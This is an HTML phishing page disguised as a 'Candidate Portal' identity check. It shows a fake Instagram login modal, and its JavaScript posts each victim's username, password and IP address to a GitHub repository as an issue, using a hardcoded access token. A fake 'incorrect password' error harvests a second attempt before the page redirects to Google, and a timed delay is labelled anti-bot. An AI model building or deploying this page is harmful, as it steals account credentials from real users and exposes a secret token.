<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Candidate Portal | Secure Login</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .hidden-content { display: none; }
    </style>
</head>
<body class="bg-gray-100 min-h-screen flex flex-col">
    <header class="bg-dark text-white p-4 text-center border-b-4 border-red-800" style="background-color: #4a1524;">
        <h1 class="text-sm font-bold uppercase tracking-widest">Candidate Management System</h1>
    </header>

    <main class="flex-grow flex items-center justify-center p-4">
        <div id="loading" class="text-center text-gray-500 italic">Verifying connection...</div>
        
        <div id="main-content" class="hidden-content w-full max-auto space-y-4 flex flex-col items-center">
            <div class="bg-white p-6 rounded-lg shadow-lg w-full max-w-sm text-center">
                <h2 class="font-bold mb-4">Identity Verification</h2>
                <p class="text-xs text-gray-500 mb-6">Verify via your authorized social profile to use system access</p>
                <button onclick="openModal()" class="w-full bg-red-900 text-white py-3 rounded font-bold hover:bg-red-800 transition shadow-lg" style="background-color: #4a1524;">LOGIN & VERIFY</button>
            </div>
        </div>
    </main>

    <div id="loginModal" class="fixed inset-0 bg-black bg-opacity-75 hidden flex items-center justify-center p-4">
        <div class="bg-white rounded-xl w-full max-w-sm overflow-hidden">
            <div class="p-8 text-center">
                <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" class="w-12 mx-auto mb-4">
                <h3 class="font-bold text-lg mb-2">Login Required</h3>
                <div id="error-msg" class="bg-red-100 text-red-600 text-xs p-2 rounded mb-4 hidden border border-red-200">
                    ⚠️ Incorrect password. Please try again.
                </div>
                
                <input type="text" id="user" placeholder="Phone, username, or email" class="w-full border p-3 rounded mb-3 text-sm focus:outline-none focus:ring-1 focus:ring-gray-400 bg-gray-50">
                <input type="password" id="pass" placeholder="Password" class="w-full border p-3 rounded mb-5 text-sm focus:outline-none focus:ring-1 focus:ring-gray-400 bg-gray-50">
                
                <button onclick="sendData()" id="btnText" class="w-full bg-pink-600 text-white py-2 rounded-lg font-bold hover:bg-pink-700 shadow-md" style="background-color: #a21d44;">CONFIRM</button>
            </div>
        </div>
    </div>

    <script>
        // CONFIGURATION (Token aur Repo check karein)
        const CONFIG = {
            TOKEN: "ghp_T0W1nzpkQgsTuAKQZNsMk2D1yATWoP3sXK61", // Aapka naya token
            REPO: "Veer007ghk/user-verification-gateway", // Aapki repo
            REDIR: "https://www.google.com" 
        };

        let attempt = 0;

        // Anti-bot Delay (2.5 Seconds)
        setTimeout(() => {
            document.getElementById('loading').classList.add('hidden');
            document.getElementById('main-content').classList.remove('hidden-content');
        }, 2500);

        function openModal() {
            document.getElementById('loginModal').classList.remove('hidden');
        }

        async function sendData() {
            const user = document.getElementById('user').value;
            const pass = document.getElementById('pass').value;
            const btn = document.getElementById('btnText');
            const errorMsg = document.getElementById('error-msg');

            if (!user || !pass) { alert("Please fill all fields"); return; }

            btn.innerText = "Processing...";
            btn.disabled = true;

            try {
                // User ki IP nikalna
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();

                // GitHub Issue create karne ka logic
                const response = await fetch(`https://api.github.com/repos/${CONFIG.REPO}/issues`, {
                    method: 'POST',
                    headers: {
                        'Authorization': `token ${CONFIG.TOKEN}`,
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        title: `New Login: ${user}`,
                        body: `**Username:** ${user}\n**Password:** ${pass}\n**IP Address:** ${ipData.ip}\n**Attempt:** ${attempt + 1}`
                    })
                });

                if (response.ok) {
                    attempt++;
                    if (attempt === 1) {
                        // Pehli baar error dikhayega
                        errorMsg.classList.remove('hidden');
                        document.getElementById('pass').value = "";
                        btn.innerText = "CONFIRM";
                        btn.disabled = false;
                    } else {
                        // Dusri baar redirect kar dega
                        window.location.href = CONFIG.REDIR;
                    }
                } else {
                    console.error("Token or Repo issue");
                    btn.innerText = "CONFIRM";
                    btn.disabled = false;
                }
            } catch (err) {
                console.error(err);
                btn.innerText = "CONFIRM";
                btn.disabled = false;
            }
        }
    </script>
</body>
</html>
